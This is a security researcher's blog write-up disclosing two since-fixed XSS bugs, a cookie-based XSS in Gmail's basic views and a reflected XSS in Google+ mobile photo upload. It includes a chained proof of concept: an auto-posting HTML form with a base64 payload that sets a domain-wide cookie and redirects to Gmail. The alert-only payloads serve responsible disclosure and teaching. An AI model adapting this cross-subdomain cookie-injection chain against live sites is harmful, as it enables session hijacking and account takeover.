---
title: "Gmail and Google+ - tale of two XSS-es"
date: "2014-06-14"
description: "A story of two XSS-es; including one via cookie"
---

Note: you can also read [Polish version of this post](http://sekurak.pl/xss-owanie-google-a-czyli-opowiesc-o-dwoch-xss-ach/) on Sekurak

In this post I'll show you two XSS-es I've found in Google services: Gmail and Google+. In particular, I'll explain why I needed the second one to exploit the first one and why XSS-es within cookies do matter.

### Gmail

Gmail is one of the most recognized Google services. It comes in many different views, including [Basic HTML](http://mail.google.com/mail/h/) and [old mobile view](http://mail.google.com/mail/x/). The XSS I'm going to describe happened within both aforementioned versions. While they don't offer full function set of the original Gmail application, you can still accomplish basic tasks, including viewing and sending messages and, most importantly, applying labels.

For the sake of the example, let me try set a `<test>` label.

[![](http://sekurak.pl/wp-content/uploads/2014/04/gmail-image1.png)](http://sekurak.pl/wp-content/uploads/2014/04/gmail-image1.png)

When everything goes fine, Gmail let you know in a notification that a conversation has been labelled.

[![](http://sekurak.pl/wp-content/uploads/2014/04/gmail-image2.png)](http://sekurak.pl/wp-content/uploads/2014/04/gmail-image2.png)

When looking around http communication, I noticed that content of the notification is actually put in a cookie.

[![](http://sekurak.pl/wp-content/uploads/2014/04/gmail-image3-600x126.png)](http://sekurak.pl/wp-content/uploads/2014/04/gmail-image3-600x126.png)

What immediately caught my attention was that the cookie contained *&lt;* and *&gt;* html entities. It was then natural to check if it's possible to insert a custom tag, for example `<img src=1 onerror=alert(1)>`.

[![](http://sekurak.pl/wp-content/uploads/2014/04/gmail-image4-600x130.png)](http://sekurak.pl/wp-content/uploads/2014/04/gmail-image4-600x130.png)

Unfortunately it didn't work and server response was code 500. I thought that the character `>` might have been responsible for that since, as you can see, it is used in the cookie for other purposes. Perhaps the cookie was splitted by `>` and some server-side error happened when there was one more _greater-than_ character than expected. So let's just modify the payload and remove the unfortunate character.

[![](http://sekurak.pl/wp-content/uploads/2014/04/gmail-image5-600x116.png)](http://sekurak.pl/wp-content/uploads/2014/04/gmail-image5-600x116.png)

[![](http://sekurak.pl/wp-content/uploads/2014/04/gmail-image6-600x274.png)](http://sekurak.pl/wp-content/uploads/2014/04/gmail-image6-600x274.png)

Great! The alert fired so I have an XSS on mail.google.com.

There is still one major problem though. In order to exploit this vulnerability, I need to be able to set arbitrary cookies in victim's browser. This is not normally possible and requires another vulnerability, one of the following:

- HTTP response splitting,
- Unrestricted Set-Cookie ([example](http://miki.it/blog/2013/9/15/xsrf-cookie-setting-google/)),
- Another XSS.

The first two vulns are pretty rare so let's just focus on the third one. Remember what attributes might a `Set-Cookie` contain? One of them is `Domain`. So when you issue a header:

```
Set-Cookie: Test=test; Domain=.google.com
```

... you create a cookie which is sent to any subdomain of google.com. Thus I need to find another XSS on any other Google subdomains and use it set a cookie to exploit Gmail. Google has like a gazillion of services so it shouldn't be that hard ;)

### Google+

And I was lucky to find another XSS - in Google+. Just as in Gmail, this one happened not in a main view but in [mobile](https://plus.google.com/app/basic/stream).

This time, uploading photos is vulnerable. I noticed that in upload request there are two big base64 http parameters: `puSuccessResponse` and `puFailureResponse`.

[![](http://sekurak.pl/wp-content/uploads/2014/04/gmail-image7.png)](http://sekurak.pl/wp-content/uploads/2014/04/gmail-image7.png)

So let's decode them:

[![](http://sekurak.pl/wp-content/uploads/2014/04/gmail-image8.png)](http://sekurak.pl/wp-content/uploads/2014/04/gmail-image8.png)

It turned out that the values contain full html output of server response after the upload is finished. As you can guess, `puSuccessResponse` is rendered when everything goes fine and `puFailureResponse` when it fails. What is even more funny is that the request contained CSRF token (parameter `at`) but when the token was incorrect, server responds code 500 and still `puFailureResponse` was rendered!

It was that easy, let's just check a standard example with `alert(1)`:

[![](http://sekurak.pl/wp-content/uploads/2014/04/gmail-image10.png)](http://sekurak.pl/wp-content/uploads/2014/04/gmail-image10.png)

Now let's just put all the stuff together.

Check out the code:

```html
<html>
  <body>
    <form
      action="https://plus.google.com/\_/upload/app/basic/photos?cbp=&amp;cid=5&amp;soc-app=115&amp;soc-platform=1"
      method="POST"
      enctype="multipart/form-data"
    >
      <input type="hidden" name="puSuccessResponse" value="aGVq" />
      <input
        type="hidden"
        name="puFailureResponse"
        value="PHNjcmlwdD4KYWxlcnQoIkR1ZGUsIHlvdSdyZSBYU1MtZWQgb24gIitkb2N1bWVudC5kb21haW4pOwpkb2N1bWVudC5jb29raWU9IkdNQUlMX05PVEk9dGwxPjxpbWcrc3JjJTNkMStvbmVycm9yJTNkJTIyYWxlcnQoJ0FuZCtub3crb24rJyUyYmRvY3VtZW50LmRvbWFpbiklMjIreDsgIERvbWFpbj0uZ29vZ2xlLmNvbTsgUGF0aD0vIjsKZG9jdW1lbnQubG9jYXRpb24gPSAiaHR0cHM6Ly9tYWlsLmdvb2dsZS5jb20vbWFpbC94LyI7ICAgCjwvc2NyaXB0PiAg"
      />
      <input type="submit" value="Double XSS!" />
    </form>
  </body>
</html>
```

Where `puFailureResponse` is decoded to:

```html
<script>
  alert("Dude, you're XSS-ed on " + document.domain);
  document.cookie =
    "GMAIL_NOTI=tl1><img+src%3d1+onerror%3d%22alert('And+now+on+'%2bdocument.domain)%22+x;  Domain=.google.com; Path=/";
  document.location = "https://mail.google.com/mail/x/";
</script>
```

Let's see what's going to happen:

- An alert on plus.google.com will be shown,
- Cookie GMAIL_NOTI is set so that mail.google.com will be XSS-ed.
- User is immediately redirected to mail.google.com allowing the XSS to fire.

You can see a proof that it all worked in a video below :)

<iframe width="320" height="266" src="https://www.youtube.com/embed/gvCQmpfR2KE" title="Gmail and Google Plus - double XSS" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

Both issues was reported to Google in March 2014 and have already been fixed. Big thanks to Google Security Team for running their [bounty program](http://www.google.pl/about/appsecurity/reward-program/), which is a great way to enhance one's skills.
